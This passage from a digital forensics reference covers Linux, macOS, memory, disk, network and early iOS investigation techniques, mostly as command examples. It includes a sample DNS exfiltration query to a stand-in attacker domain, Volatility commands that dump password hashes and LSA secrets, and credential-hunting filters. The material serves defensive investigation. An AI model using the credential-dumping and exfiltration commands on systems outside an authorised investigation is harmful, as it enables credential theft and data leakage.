# Search for specific syscalls
ausearch -sc execve -ts recent
ausearch -m USER_LOGIN,USER_AUTH -ts today
ausearch -f /etc/passwd  # Access to sensitive file

# Generate report
aureport --summary
aureport --login --failed --summary
```

---

### ext4 Filesystem Forensics

#### Key Filesystem Concepts
- **Inodes:** Metadata structures storing file permissions, timestamps, ownership, and data block pointers
- **Timestamps:** atime (access), mtime (modification), ctime (inode change), crtime (creation -- ext4 only)
- **Deleted files:** When a file is deleted, the inode is marked free but data blocks may persist until overwritten

```bash
# Mount evidence image read-only
mount -o ro,noexec,noatime -t ext4 /dev/sdb1 /mnt/evidence

# Check filesystem metadata
dumpe2fs /dev/sdb1 | head -80

# Find deleted files (ext4)
debugfs /dev/sdb1 -R "lsdel" > deleted_files.txt

# Recover deleted file by inode
debugfs /dev/sdb1 -R "dump <inode> /tmp/recovered_file"

# extundelete for automated recovery
extundelete /dev/sdb1 --restore-all --output-dir recovered/

# Inode analysis with stat
stat /mnt/evidence/path/to/file
debugfs /dev/sdb1 -R "stat <inode>"
```

---

### macOS Artifacts

#### Unified Log System
macOS Unified Logging replaced the traditional syslog system starting in macOS 10.12 Sierra. Logs are stored in a binary compressed format at `/private/var/db/diagnostics/` and `/private/var/db/uuidtext/`.

```bash
# View recent logs
log show --last 1h

# Filter with predicate
log show --predicate 'process == "sshd"' --last 7d
log show --predicate 'eventMessage CONTAINS "failed"' --start "2024-01-01" --end "2024-01-31"
log show --predicate 'subsystem == "com.apple.security"' --info --debug

# Stream live
log stream --predicate 'process == "bash"' --info

# Export to syslog format
log show --style syslog --last 24h > unified_log.txt

# From acquired image (specify log archive path)
log show --archive /path/to/system_logs.logarchive
```

#### FSEvents
FSEvents records filesystem change events at `/System/Volumes/Data/.fseventsd/` (macOS Catalina+) or `/.fseventsd/` (older).

Binary format files named with hex IDs. Parse with:
```bash
# FSEventsParser
python3 FSEventsParser.py -f /path/to/fseventsd/ -o output/

# Or with mac_apt plugin
mac_apt.py ... FSEVENTS
```

#### Quarantine Events Database
macOS GateKeeper records every downloaded file in:
`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`

```bash
sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \
  "SELECT datetime(LSQuarantineTimeStamp + 978307200, 'unixepoch', 'localtime'), LSQuarantineDataURLString, LSQuarantineOriginURLString, LSQuarantineSenderName FROM LSQuarantineEvent ORDER BY LSQuarantineTimeStamp DESC;"
```

#### TCC Database (Privacy Preferences)
Transparency Consent and Control database records app permissions for camera, microphone, location, contacts, etc.:
`/Library/Application Support/com.apple.TCC/TCC.db` (system)
`~/Library/Application Support/com.apple.TCC/TCC.db` (user)

```bash
sqlite3 TCC.db "SELECT client, service, auth_value, last_modified FROM access;"
```

#### KnowledgeC Database
Records app usage, device interactions, and user activity:
`/private/var/db/CoreDuet/Knowledge/knowledgeC.db`
`~/Library/Application Support/Knowledge/knowledgeC.db`

```bash
sqlite3 knowledgeC.db "SELECT datetime(ZOBJECT.ZSTARTDATE + 978307200, 'unixepoch', 'localtime') as start_time, ZOBJECT.ZVALUESTRING FROM ZOBJECT WHERE ZOBJECT.ZSTREAMNAME = '/app/inFocus';"
```

#### macOS Plists
Many macOS artifacts are stored in Property List (plist) format (binary or XML):
```bash
# Convert binary plist to XML
plutil -convert xml1 -o - /path/to/file.plist

# On Linux
plistutil -i binary.plist -o output.xml

# Python parsing
python3 -c "import plistlib; d=plistlib.load(open('file.plist','rb')); print(d)"
```

#### mac_apt (macOS Artifact Parsing Tool)
```bash
# Install
pip3 install mac_apt

# Run against mounted image
mac_apt.py -i /Volumes/Evidence -o output/ ALL

# Specific plugins
mac_apt.py -i /Volumes/Evidence -o output/ BLUETOOTH CHROME FIREFOX SAFARI IMESSAGE KNOWLEDGEC QUARANTINE RECENTITEMS SAFARI SYSLOG TERMSESSIONS USERS
```

---
## 5. Memory Forensics

### Memory Acquisition

RAM acquisition must occur before system shutdown. All acquisition tools should be run from read-only media (USB) to minimize contamination.

#### Windows Memory Acquisition

**WinPmem:**
```cmd
winpmem_mini_x64.exe -o memdump.raw
winpmem_mini_x64.exe --format raw -o memdump.raw
```

**DumpIt (Comae/Magnet):**
```cmd
DumpIt.exe /O memdump.raw /T RAW
DumpIt.exe /O memdump.dmp /T DMP   :: Crash dump format
```

**Magnet RAM Capture:**
- GUI-based, free tool from Magnet Forensics
- Outputs to DMP or RAW format
- Shows estimated acquisition time

**Belkasoft RAM Capturer:**
```cmd
RamCapture64.exe "output.mem"
```

**FTK Imager:**
File > Capture Memory > select output path > include pagefile option

#### Linux Memory Acquisition

**LiME (Linux Memory Extractor)** — Kernel module approach:
```bash
# Build LiME for target kernel
sudo apt install linux-headers-$(uname -r) build-essential
git clone https://github.com/504ensicsLabs/LiME
cd LiME/src && make

# Load module and capture to file
sudo insmod lime-$(uname -r).ko "path=/external/memdump.lime format=lime"

# Capture over network (avoids writing to suspect disk)
sudo insmod lime-$(uname -r).ko "path=tcp:4444 format=lime"
# On collector machine:
nc <suspect_IP> 4444 > memdump.lime
```

#### macOS Memory Acquisition

**osxpmem:**
```bash
sudo ./osxpmem.app/osxpmem -o memdump.aff4
sudo ./osxpmem.app/osxpmem -o memdump.raw --format raw
```

Note: SIP (System Integrity Protection) and Apple Silicon restrict memory acquisition. T2/M-series Macs require special approaches.

---

### Volatility 3 Framework

Volatility 3 removed profiles (Volatility 2 requirement) in favor of automatic symbol resolution.

**Installation:**
```bash
pip3 install volatility3
# Or from source
git clone https://github.com/volatilityfoundation/volatility3
pip3 install -r requirements.txt

# Download symbol tables for Windows analysis
# https://downloads.volatilityfoundation.org/volatility3/symbols/
```

**Basic Usage:**
```bash
vol3 -f memdump.raw windows.info
vol3 -f memdump.raw -r pretty <plugin>
vol3 -f memdump.raw --output-file output.csv --output csv <plugin>
```

#### Core Windows Plugins

**Process Analysis:**
```bash
# List all processes (flat list)
vol3 -f memdump.raw windows.pslist

# Process tree (parent-child relationships)
vol3 -f memdump.raw windows.pstree

# Command-line arguments for each process
vol3 -f memdump.raw windows.cmdline

# Detect hidden/unlinked processes (rootkit detection)
vol3 -f memdump.raw windows.psscan  # Scans pool tags vs EPROCESS list

# Environment variables
vol3 -f memdump.raw windows.envars --pid <PID>

# Process privileges
vol3 -f memdump.raw windows.privileges --pid <PID>
```

**Network Analysis:**
```bash
# Network connections (active and recently closed)
vol3 -f memdump.raw windows.netscan
vol3 -f memdump.raw windows.netstat  # Similar to netstat -ano

# Sort by PID to correlate with process list
vol3 -f memdump.raw windows.netscan | sort -k5
```

**DLL and Module Analysis:**
```bash
# List DLLs per process
vol3 -f memdump.raw windows.dlllist --pid <PID>

# Find processes not matching expected DLLs (DLL injection detection)
vol3 -f memdump.raw windows.dlllist | grep -v "\\Windows\\System32"

# Loaded kernel modules
vol3 -f memdump.raw windows.modules
vol3 -f memdump.raw windows.modscan  # Pool tag scan for hidden modules
```

**File and Handle Analysis:**
```bash
# Open handles for a process
vol3 -f memdump.raw windows.handles --pid <PID>

# Scan for FILE_OBJECT structures
vol3 -f memdump.raw windows.filescan

# Dump a file from memory
vol3 -f memdump.raw windows.dumpfiles --virtaddr <address>
vol3 -f memdump.raw windows.dumpfiles --physaddr <address>
```

**Memory Region Analysis:**
```bash
# Virtual address descriptor (VAD) tree -- all memory regions per process
vol3 -f memdump.raw windows.vadinfo --pid <PID>

# MALFIND -- detect process injection
# Looks for: executable memory not backed by a file (VAD with no mapped file)
# and matching PE header (MZ/4D5A) or shellcode patterns
vol3 -f memdump.raw windows.malfind
vol3 -f memdump.raw windows.malfind --pid <PID> --dump

# Dump malfind results
vol3 -f memdump.raw windows.malfind --dump --output-dir injected_code/
```

**Registry Forensics from Memory:**
```bash
# List registry hives loaded in memory
vol3 -f memdump.raw windows.registry.hivelist

# Print keys from a hive
vol3 -f memdump.raw windows.registry.printkey --offset <hive_offset> --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Dump all user hashes (pass-the-hash attacks)
vol3 -f memdump.raw windows.hashdump

# Extract cached domain credentials
vol3 -f memdump.raw windows.cachedump

# LSA secrets
vol3 -f memdump.raw windows.lsadump
```

**MFT and Filesystem from Memory:**
```bash
# Parse $MFT from memory
vol3 -f memdump.raw windows.mftscan.MFTScan
vol3 -f memdump.raw windows.mftscan.ADS  # Alternate Data Streams
```

---

### Detecting Process Injection

Process injection techniques hide malicious code inside legitimate processes. Key detection methods:

#### Malfind Analysis
Malfind output columns:
- **PID / Process:** Target process
- **Start VPN / End VPN:** Virtual memory range
- **Tag:** VAD tag (usually "VadS" for suspicious private allocations)
- **Protection:** PAGE_EXECUTE_READWRITE (RWX) is highly suspicious
- **Commit Charge / PrivateMemory:** Private, uncommitted memory
- Hexdump showing MZ header or shellcode bytes

**Indicators of process injection:**
```
Protection: PAGE_EXECUTE_READWRITE
No mapped file (VadS instead of Vad)
MZ header (4D 5A) at the start of the region
```

#### Hollowed Processes (Process Hollowing)
```bash
# Compare process image path vs VAD-mapped executable
vol3 -f memdump.raw windows.pslist | grep svchost
vol3 -f memdump.raw windows.vadinfo --pid <svchost_PID> | grep MappedFile

# If MappedFile does not match expected executable path => hollowing
# Also: process has no DLLs loaded (hollow)
vol3 -f memdump.raw windows.dlllist --pid <PID>
```

#### DLL Injection Detection
```bash
# Look for DLLs in unusual paths
vol3 -f memdump.raw windows.dlllist | grep -iv "system32\|syswow64\|program files"

# Reflective DLL injection: DLL appears in VAD but not in PEB module list
vol3 -f memdump.raw windows.vadinfo --pid <PID> | grep ".dll"
vol3 -f memdump.raw windows.dlllist --pid <PID>
# Compare -- discrepancies suggest reflective injection
```

---

### Linux Memory Plugins

```bash
# Process list
vol3 -f memdump.lime linux.pslist
vol3 -f memdump.lime linux.pstree

# Bash history from memory
vol3 -f memdump.lime linux.bash

# Network connections
vol3 -f memdump.lime linux.netstat
vol3 -f memdump.lime linux.sockstat

# Kernel modules (rootkit detection)
vol3 -f memdump.lime linux.lsmod
vol3 -f memdump.lime linux.check_modules  # Hidden kernel modules

# Check syscall table for hooks
vol3 -f memdump.lime linux.check_syscall

# File scan
vol3 -f memdump.lime linux.find_file -F /etc/passwd
```

---

### MemProcFS

MemProcFS provides a filesystem-like interface to memory contents, making analysis more intuitive:

```bash
# Mount memory image as filesystem
./memprocfs -device memdump.raw -mount /mnt/memory

# Browse like a filesystem
ls /mnt/memory/
ls /mnt/memory/pid/              # All processes
ls /mnt/memory/pid/1234/         # Process 1234
cat /mnt/memory/pid/1234/cmdline
ls /mnt/memory/pid/1234/modules/ # Loaded DLLs
ls /mnt/memory/pid/1234/handles/ # Open handles
cat /mnt/memory/registry/hive_files/hklm_software.reghive  # Registry hives

# Enable forensic mode (slower but more thorough)
./memprocfs -device memdump.raw -mount /mnt/memory -forensic 1
```

---

### Hibernation File and Pagefile Analysis

#### hiberfil.sys (Windows Hibernation)
Located at `C:\\hiberfil.sys`. Contains a compressed snapshot of RAM from the last hibernation. Laptops that hibernate rather than shut down preserve full memory state.

```bash
# Decompress hiberfil.sys to raw memory image
python3 hibr2bin.py -i hiberfil.sys -o memdump.raw

# Then analyze with Volatility normally
vol3 -f memdump.raw windows.pslist
```

#### pagefile.sys (Windows Paging File)
Contains pages swapped out of RAM. May contain:
- Credentials from browsers, applications
- Command history
- Fragments of malware or shellcode
- Encryption keys after swap-out

```bash
# Strings extraction
strings -n 8 pagefile.sys | grep -iE "password|credential|secret|token"

# Search for PE headers in page file
grep -boa "MZ" pagefile.sys | awk -F: '{print $1}' | head -20
```

---
## 6. Disk & File System Forensics

### Partition Analysis — MBR vs GPT

#### MBR (Master Boot Record)
- Located in the first 512 bytes (sector 0) of the disk
- Maximum 4 primary partitions (or 3 primary + 1 extended)
- Maximum disk size: 2 TB
- Structure: 446 bytes bootcode + 64 bytes partition table (4 x 16-byte entries) + 2-byte signature (0x55AA)

```bash
# View MBR with mmls (The Sleuth Kit)
mmls -t dos evidence.dd

# Hexdump MBR
dd if=evidence.dd bs=512 count=1 | xxd | head -32
```

#### GPT (GUID Partition Table)
- Used on modern systems (UEFI) and disks >2TB
- Supports up to 128 partitions
- Stores backup GPT header at end of disk (resilient to corruption)
- Primary GPT header at LBA 1, partition entries at LBA 2-33

```bash
mmls -t gpt evidence.dd
gdisk -l evidence.dd  # View GPT structure
```

---

### Filesystem Types Reference

| Filesystem | OS | Max File Size | Max Volume | Notes |
|-----------|-----|--------------|-----------|-------|
| NTFS | Windows | 16 EB (theoretical) | 256 TB | Journaled; supports ACLs, ADS, VSS |
| ext4 | Linux | 16 TB | 1 EB | Journaled; extents-based |
| FAT32 | Cross-platform | 4 GB | 32 GB (2 TB with large clusters) | No journaling; no permissions |
| exFAT | Cross-platform | 128 PB | 128 PB | USB/flash cards; no journaling |
| APFS | macOS 10.13+ | 8 EB | 8 EB | Copy-on-write; snapshots; encryption |
| HFS+ | macOS (legacy) | 8 EB | 8 EB | Journaled; case-insensitive by default |
| Btrfs | Linux | 16 EB | 16 EB | Copy-on-write; snapshots; RAID |

---

### The Sleuth Kit (TSK) Commands

**mmls — Partition Layout:**
```bash
mmls evidence.dd
# Output shows: slot, start sector, end sector, length, description
```

**fsstat — Filesystem Statistics:**
```bash
fsstat -o <sector_offset> evidence.dd
# Shows: filesystem type, volume label, block size, cluster count, metadata range
```

**fls — File Listing:**
```bash
fls -r -o <offset> evidence.dd           # Recursive file listing
fls -r -d -o <offset> evidence.dd        # Show only deleted files
fls -r -o <offset> evidence.dd | grep -i "\.pdf$"  # Filter by extension
```

**istat — Inode/MFT Entry Statistics:**
```bash
istat -o <offset> evidence.dd <inode>
# Shows: allocated/deleted, MFT entry details, timestamps, attributes
```

**icat — Extract File Content by Inode:**
```bash
icat -o <offset> evidence.dd <inode> > recovered_file.pdf
# Works even for deleted files if blocks not overwritten
```

**tsk_recover — Automated File Recovery:**
```bash
tsk_recover -e -o <offset> evidence.dd recovered_files/
# -e flag recovers allocated + unallocated files
```

**blkcat / blkls — Block Analysis:**
```bash
blkcat -o <offset> evidence.dd <block_number> | xxd  # Hex dump of block
blkls -o <offset> evidence.dd > unallocated.bin      # Extract unallocated space
```

---

### Autopsy Case Management

Autopsy provides a GUI front-end for Sleuth Kit with additional analysis modules.

**Creating a New Case:**
1. File > New Case > enter case name and directory
2. Add Data Source > select image file or local disk
3. Configure ingest modules:
   - Hash Lookup (NSRL, known bad hashsets)
   - Keyword Search (custom keyword lists)
   - File Type Identification
   - Embedded File Extractor
   - EXIF Parser
   - Recent Activity (browser history, downloads)
   - Email Parser
   - Correlation Engine

**Timeline Analysis:**
Tools > Timeline > select time range > filter by event type
- File system events (MAC times)
- Web activity
- Log events
- Registry events

**Keyword Search:**
- Add keyword lists (regex or literal)
- Search across all extracted text
- GREP-compatible regular expressions

**Hash Lookup:**
```bash
# Generate hashset from known good files
md5sum /Windows/System32/*.dll > known_good.txt

# Import into Autopsy: Tools > Options > Hash Sets
```

---

### File Carving

File carving recovers files from unallocated space using header/footer signatures (magic bytes), without relying on filesystem metadata.

#### Magic Bytes Reference

| File Type | Header (Hex) | Footer (Hex) | Notes |
|-----------|-------------|-------------|-------|
| PDF | `25 50 44 46` (%PDF) | `25 25 45 4F 46` (%%EOF) | Variable offset |
| JPEG | `FF D8 FF` | `FF D9` | |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `49 45 4E 44 AE 42 60 82` | |
| ZIP/DOCX/XLSX | `50 4B 03 04` | `50 4B 05 06` | ZIP local file header |
| GIF | `47 49 46 38` (GIF8) | `00 3B` | |
| Windows PE | `4D 5A` (MZ) | -- | Use size from PE header |
| SQLite | `53 51 4C 69 74 65 20 33` (SQLite 3) | -- | |
| ELF | `7F 45 4C 46` | -- | Linux executables |

#### Scalpel Configuration and Usage
```bash
# /etc/scalpel/scalpel.conf -- define file types to carve
# Uncomment desired file types, e.g.:
# jpg y 200000000 \xff\xd8\xff\xe0\x00\x10 \xff\xd9
# pdf y 10000000 %PDF- %%EOF

scalpel evidence.dd -o carved_output/
scalpel unallocated.bin -o carved_output/ -c /etc/scalpel/scalpel.conf
```

#### PhotoRec
```bash
# Interactive CLI carver (no config needed)
photorec evidence.dd
# Select partition > filesystem type > output directory > file types

# Non-interactive mode
photorec /log /d recovered_files/ /cmd evidence.dd partition_none,options,everything,fileopt,jpg,enable,search
```

---

### NTFS-Specific Forensics

#### Alternate Data Streams (ADS)
ADS allow data to be hidden within a file, invisible to normal directory listings.

```cmd
:: List ADS (CMD)
dir /r C:\suspect_directory\

:: View ADS content
more < file.txt:hidden_stream

:: Extract ADS
streams.exe -s C:\directory\  :: Sysinternals Streams tool
```

```bash
# Linux/SIFT with ntfs-3g
ntfscat evidence.ntfs file.txt:hidden_stream > stream_content
ntfsls -a evidence.ntfs  # Show ADS in file listing
```

#### $LogFile (NTFS Transaction Log)
Records NTFS transactions for crash recovery. Can reconstruct recent filesystem changes:
```bash
# Parse $LogFile
LogFileParser.exe -f "$LogFile" --csv output\
```

#### Zone.Identifier ADS
Windows automatically adds Zone.Identifier ADS to downloaded files (Mark of the Web):
```cmd
more < downloaded_file.exe:Zone.Identifier
:: Contains [ZoneTransfer] ZoneId=3 (Internet)
:: And sometimes HostUrl= and ReferrerUrl=
```

---

### Deleted File Recovery Methodology

1. **Check Recycle Bin** — Many users send files to Recycle Bin rather than permanent delete
2. **Check $UsnJrnl** — Records file deletion events with original path
3. **Carve unallocated space** — Use Scalpel/PhotoRec if filesystem metadata is overwritten
4. **Check Volume Shadow Copies** — Previous versions of files
5. **Check prefetch/Amcache** — Proves execution even if file deleted
6. **Check thumbnail caches** — Proves images were viewed
7. **Check backup locations** — %LOCALAPPDATA%\Temp, OneDrive, backup shares

---

### Volume Shadow Copy Forensics

```cmd
:: List all shadow copies
vssadmin list shadows /for=C:

:: List shadow copy storage
vssadmin list shadowstorage

:: Create symlink to mount shadow copy
mklink /d C:\VSS \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

:: Browse and copy from shadow
dir C:\VSS\Users\
robocopy "C:\VSS\Users\Suspect" "C:\Evidence\PreviousVersion" /E

:: Cleanup symlink
rmdir C:\VSS
```

**vshadowmount (Linux/SIFT):**
```bash
vshadowinfo evidence.E01   # List shadow copies in image
vshadowmount evidence.E01 /mnt/vss/
ls /mnt/vss/
mount -o ro,loop /mnt/vss/vss1 /mnt/shadow1/
```

---

### Disk Encryption Forensics

#### BitLocker
Recovery key locations:
- Active Directory: `Get-ADObject -Filter {objectclass -eq 'msFVE-RecoveryInformation'} -Properties msFVE-RecoveryPassword`
- Microsoft Account: account.microsoft.com/devices/recoverykey
- Memory: Search for FVEK (Full Volume Encryption Key) in memory dump
- TPM: May auto-unlock without PIN on some configurations

```bash
# Mount BitLocker volume on Linux (read-only)
dislocker -V /dev/sdb2 -u<password> -- /mnt/dislocker
mount -o ro /mnt/dislocker/dislocker-file /mnt/cleartext
```

#### VeraCrypt/TrueCrypt Analysis
VeraCrypt volumes appear as random data with no identifying headers (plausible deniability). Detection requires:
- Looking for container files with random entropy (chi-squared test)
- Checking recently accessed files lists for .vc/.tc extensions
- Memory analysis for mounted volume keys

```bash
# Check entropy of a file (high entropy = likely encrypted/compressed)
ent suspicious_file.bin
# Entropy > 7.9 bits/byte suggests encryption or compression
```

#### RAID Reconstruction
```bash
# Identify RAID configuration
mdadm --examine /dev/sdb /dev/sdc /dev/sdd

# Reconstruct RAID array from evidence images
mdadm --assemble --run /dev/md0 image1.dd image2.dd image3.dd

# Manual reconstruction using dd for simple RAID-0 (striped)
# Stripe size x number of drives = calculate offsets
```

---
## 7. Network Forensics

### PCAP Analysis with Wireshark

#### Display Filter Cheat Sheet (Forensics-Focused)

```
# HTTP
http.request.method == "POST"
http contains "password"
http.response.code == 200 && frame.len > 500000

# DNS
dns.qry.name contains ".onion"
dns.qry.type == 28
dns.flags.rcode == 3
dns.resp.ttl < 60

# TLS/SSL
tls.handshake.type == 1
ssl.record.content_type == 21
tls.handshake.extensions_server_name contains "suspicious.com"

# IP/TCP
ip.addr == 192.168.1.100
tcp.flags.syn == 1 && tcp.flags.ack == 0
tcp.analysis.retransmission
not ip.addr == 10.0.0.0/8 && not ip.addr == 192.168.0.0/16

# SMB (lateral movement)
smb2.filename contains ".exe"
smb.cmd == 0x25

# ICMP tunneling detection
icmp.data_len > 100

# Credential hunting
ftp.request.command == "PASS"
pop.request.command == "PASS"
imap contains "login"
```

#### Tshark Command-Line Extraction
```bash
# Extract all HTTP objects (files)
tshark -r capture.pcap --export-objects http,http_objects/

# Extract all files
tshark -r capture.pcap --export-objects smb,smb_objects/
tshark -r capture.pcap --export-objects imf,imf_objects/

# Extract field values to CSV
tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e http.request.uri -E header=y -E separator=, > http_requests.csv

# Filter and extract
tshark -r capture.pcap -Y "dns" -T fields -e frame.time -e ip.src -e dns.qry.name -e dns.resp.addr > dns_queries.csv

# Statistics
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z io,stat,60
tshark -r capture.pcap -q -z http,tree

# Decrypt TLS with key log file
tshark -r capture.pcap -o "tls.keylog_file:sslkeylog.log" -Y "http" -T fields -e http.request.uri
```

---

### NetworkMiner

NetworkMiner passively extracts artifacts from PCAP files:

```bash
# Linux (Mono-based)
mono NetworkMiner.exe capture.pcap

# Artifacts extracted:
# Files/    -- Reassembled files transferred over HTTP, FTP, SMB, SMTP
# Images/   -- Extracted images
# Messages/ -- Email messages
# Sessions/ -- TCP/UDP session list with hostname resolution
# Credentials/ -- Cleartext credentials from HTTP Basic, FTP, POP3, IMAP, SMTP
# Parameters/  -- HTTP GET/POST parameters
# DNS/      -- DNS queries with responses
```

**Key NetworkMiner features:**
- Hostname resolution from DNS traffic in PCAP (no external DNS lookups)
- OS fingerprinting via TCP/IP stack behavior
- PCAP session reassembly with file extraction

---

### Zeek (formerly Bro) Log-Based Forensics

Zeek generates rich, structured logs from network traffic. Far more forensically useful than raw PCAP for large-scale analysis.

#### Key Log Files

| Log | Contents | Key Fields |
|-----|---------|-----------|
| `conn.log` | Every TCP/UDP/ICMP connection | ts, uid, id.orig_h, id.resp_h, id.resp_p, proto, duration, orig_bytes, resp_bytes, conn_state |
| `http.log` | HTTP transactions | ts, uid, host, uri, method, status_code, resp_mime_types, filename |
| `dns.log` | DNS queries and responses | ts, query, qtype_name, answers, rcode_name, TTL |
| `ssl.log` | TLS/SSL sessions | ts, server_name (SNI), version, cipher, validation_status |
| `x509.log` | X.509 certificate details | subject, issuer, san.dns, validity dates |
| `files.log` | File transfers across protocols | fuid, tx_hosts, rx_hosts, mime_type, filename, sha256 |
| `smtp.log` | SMTP transactions | helo, mailfrom, rcptto, subject, user_agent |
| `ssh.log` | SSH sessions | auth_success, auth_attempts, client/server versions |
| `kerberos.log` | Kerberos authentications | request_type, client, service, success, error_msg |
| `weird.log` | Protocol anomalies | name (anomaly type), peer |

#### Zeek Query Examples
```bash
# Find all connections to a suspicious IP
zeek-cut id.orig_h id.resp_h id.resp_p proto duration orig_bytes resp_bytes < conn.log | awk '$2 == "185.220.101.5"'

# Find large outbound transfers (potential exfiltration)
zeek-cut id.orig_h id.resp_h id.resp_p orig_bytes resp_bytes < conn.log | awk '$5 > 10000000' | sort -k5 -rn | head -20

# Find all NXDOMAIN responses
zeek-cut ts query rcode_name < dns.log | grep "NXDOMAIN" | head -50

# Extract all files with SHA256 hashes
zeek-cut ts id.orig_h id.resp_h mime_type filename sha256 < files.log | grep -v "-"

# Find TLS connections with self-signed certificates
zeek-cut ts id.orig_h id.resp_h server_name validation_status < ssl.log | grep "self signed"
```

---

### Flow Data Analysis

NetFlow/IPFIX provides lightweight traffic metadata without payload capture.

**nfdump Analysis:**
```bash
# Read flow files
nfdump -r flows/2024/01/01/nfcapd.202401010000

# Top 20 talkers
nfdump -r flows/ -s srcip/bytes -n 20

# Connections to specific IP
nfdump -r flows/ "host 1.2.3.4" -o long

# High volume outbound (exfiltration detection)
nfdump -r flows/ "src net 10.0.0.0/8 and dst net not 10.0.0.0/8" -s dstip/bytes -n 20

# Long-duration connections (C2 beacon indicator)
nfdump -r flows/ -s dstip/flows -n 20 -o "fmt: %ts %te %sap %dap %pr %flg %byt %pkt %dur"

# Filter by port
nfdump -r flows/ "proto tcp and port 4444" -o long
```

**SiLK (System for Internet-Level Knowledge):**
```bash
rwfilter /data/silk/in/2024/01/01/in-2024010100 --start-date=2024/01/01 --end-date=2024/01/02 --daddress=1.2.3.4 --pass=stdout | rwcut --fields=sip,dip,sport,dport,proto,bytes,starttime

# Top bandwidth consumers
rwstats --fields=dip --values=bytes --count=20 /data/silk/...
```

---

### Detecting C2 Traffic

#### Beacon Analysis
C2 beacons appear as regular, periodic connections. Characteristics:
- Regular intervals (Cobalt Strike default: 60 seconds +/- 10% jitter)
- Small, consistent payload sizes (heartbeat)
- Persistent long-duration connections

```bash
# Find beaconing with rita (Real Intelligence Threat Analytics)
rita analyze --import zeek_logs/ --database investigation
rita show-beacons --database investigation --limit 20

# Manual beacon detection from conn.log
zeek-cut id.orig_h id.resp_h id.resp_p < conn.log | sort | uniq -c | sort -rn | head -20
# High counts to same destination on same port = potential beacon
```

#### JA3/JA3S Fingerprinting
JA3 fingerprints TLS ClientHello attributes (cipher suites, extensions, elliptic curves).

```bash
# Extract JA3 with Zeek (requires ja3 package)
# Or with tshark
tshark -r capture.pcap -Y "tls.handshake.type == 1" -T fields -e ip.src -e ip.dst -e tls.handshake.extensions_server_name

# Known malicious JA3 hashes (check threat intel):
# Cobalt Strike: 72a589da586844d7f0818ce684948eea (varies by config)
# Reference: https://ja3er.com/
```

#### Domain Generation Algorithm (DGA) Detection
```bash
# High NXDOMAIN rate from a single host
zeek-cut ts id.orig_h query rcode_name < dns.log | grep "NXDOMAIN" | awk '{print $2}' | sort | uniq -c | sort -rn

# Long subdomain strings (DNS tunneling)
zeek-cut query < dns.log | awk 'length($1) > 50' | sort | uniq -c | sort -rn | head -20

# Fast flux detection (many A records, short TTL)
zeek-cut query answers TTL < dns.log | awk '$3 < 300 && NF > 4'
```

---

### DNS Forensics

```bash
# Query log analysis (BIND)
grep "query:" /var/log/named/queries.log | grep "suspicious\.com"

# Extract all unique queries
awk '/query:/{print $6}' /var/log/named/queries.log | sort -u

# Large TXT record queries (exfiltration via DNS)
dig @server "exfil.base64encodeddata.attacker.com" TXT

# NXDOMAIN storm (DGA)
awk '/NXDOMAIN/{print $6}' /var/log/named/queries.log | sort | uniq -c | sort -rn | head -50
```

---

### Detecting Data Exfiltration

```bash
# Unusual outbound volume per host
zeek-cut id.orig_h id.resp_h orig_bytes < conn.log | awk '{sum[$1]+=$3} END {for (h in sum) print sum[h],h}' | sort -rn | head -20

# HTTP POST with large bodies
zeek-cut ts id.orig_h id.resp_h host uri method request_body_len < http.log | awk '$7=="POST" && $8>100000'

# Base64 in HTTP URIs (encoding for exfiltration)
zeek-cut uri < http.log | grep -P "[A-Za-z0-9+/]{50,}={0,2}"

# HTTPS to non-standard ports (bypassing proxy)
zeek-cut id.resp_p < ssl.log | grep -v "^443$" | sort | uniq -c | sort -rn
```

---

### Reconstructing Sessions from PCAP

```bash
# Follow TCP stream in Wireshark: right-click packet > Follow > TCP Stream

# Extract all HTTP response bodies
tshark -r capture.pcap -Y "http.response" -T fields -e http.file_data > http_bodies.bin

# Reconstruct specific TCP session
tcpflow -r capture.pcap "host 1.2.3.4 and port 80"
# Creates files per TCP flow: IP1.PORT1-IP2.PORT2

# Extract SMTP email from PCAP
tshark -r capture.pcap --export-objects imf,email_output/

# Reassemble video streams
tshark -r capture.pcap --export-objects http,files/
```

---
## 8. Mobile Device Forensics

### iOS Forensics

#### Acquisition Methods (Least to Most Invasive)

| Method | Data Access | Requirements |
|--------|------------|-------------|
| iTunes/Finder Backup | Logical: apps, messages, photos | iTunes backup password or no password |
| Encrypted Backup | Full app data including keychain | Backup encryption password |
| AFC2 (jailbroken) | Physical filesystem | Active jailbreak (checkra1n etc.) |
| GrayKey / Cellebrite | Physical/full filesystem | Device passcode (optional depending on exploit) |
| Chip-off | Raw NAND data | Lab-level destructive process |

#### Logical Extraction via iTunes Backup

```bash
# Backup with libimobiledevice
idevicebackup2 backup --full /path/to/backup/
ideviceinfo -s  # Device info
ideviceid       # UDID
idevicepair pair  # Pair with device

# Decrypt encrypted backup
pip install iphone-backup-decrypt

python3 -c "
from iphone_backup_decrypt import EncryptedBackup, RelativePath
backup = EncryptedBackup(backup_directory='/path/to/backup', passphrase='password')
backup.extract_file(relative_path=RelativePath.SMS, FileName='3d0d7e5fb2ce288813306e4d4636395e047a3d28')
"
```

**iTunes Backup Location:**
- Windows: `C:\\Users\\<user>\\AppData\\Roaming\\Apple Computer\\MobileSync\\Backup\\`
- macOS: `~/Library/Application Support/MobileSync/Backup/`

**Backup structure:** `Manifest.db` (SQLite) maps file domains/relative paths to hash filenames. Files stored as 2-level hash directory structure (first 2 chars of SHA1 hash).

```bash
sqlite3 Manifest.db "SELECT fileID, domain, relativePath FROM Files WHERE relativePath LIKE '%sms%';"
```

#### Key iOS Artifacts

| Artifact | Path (in backup) | Contents |
|---------|-----------------|---------|
| SMS/iMessage | `HomeDomain/Library/SMS/sms.db` | Messages, attachments, read receipts |
| Call History | `HomeDomain/Library/CallHistoryDB/CallHistory.storedata` | Calls, FaceTime, contact info |
| Contacts | `HomeDomain/Library/AddressBook/AddressBook.sqlitedb` | Contact details |
| Photos | `CameraRollDomain/Media/DCIM/` | Photos with EXIF metadata |
| Email | `HomeDomain/Library/Mail/` | IMAP/POP email data |
| Safari History | `HomeDomain/Library/Safari/History.db` | Browsing history |
| Location | `HomeDomain/Library/Caches/com.apple.routined/` | Location history |
